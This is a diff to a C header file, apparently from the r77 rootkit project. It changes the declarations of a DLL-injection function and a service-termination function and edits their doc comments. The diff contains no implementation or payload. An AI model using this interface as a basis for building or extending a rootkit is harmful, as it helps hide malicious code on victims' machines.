@@ -32,12 +32,11 @@ typedef struct _R77_PROCESS
 /// <param name="processId">The process to inject the DLL in.</param>
 /// <param name="dll">A buffer with the DLL file.</param>
 /// <param name="dllSize">dllSize The size of the DLL file.</param>
-/// <param name="fast">TRUE to not wait for DllMain to return. If this parameter is set, this function does not return FALSE, if DllMain returned FALSE.</param>
 /// <returns>
 /// TRUE, if the DLL was successfully injected and DllMain returned TRUE;
 /// otherwise, FALSE.
 /// </returns>
-BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast);
+BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize);
 
 /// <summary>
 /// Retrieves a list of all processes where an r77 header is present.
@@ -72,11 +71,9 @@ BOOL DetachInjectedProcessById(DWORD processId);
 /// </summary>
 VOID DetachAllInjectedProcesses();
 /// <summary>
-/// Terminates all r77 service processes. Typically, there are two active r77 service processes, one 32-bit and one 64-bit process.
+/// Terminates the r77 service process.
 /// </summary>
 /// <param name="excludedProcessId">A process ID that should not be terminated. Use -1 to not exclude any processes.</param>
-/// <param name="include32BitProcess">TRUE to include 32-bit processes; FALSE to exclude 32-bit processes.</param>
-/// <param name="include64BitProcess">TRUE to include 64-bit processes; FALSE to exclude 64-bit processes.</param>
-VOID TerminateR77Service(DWORD excludedProcessId, BOOL include32BitProcess, BOOL include64BitProcess);
+VOID TerminateR77Service(DWORD excludedProcessId);
 
 #endif
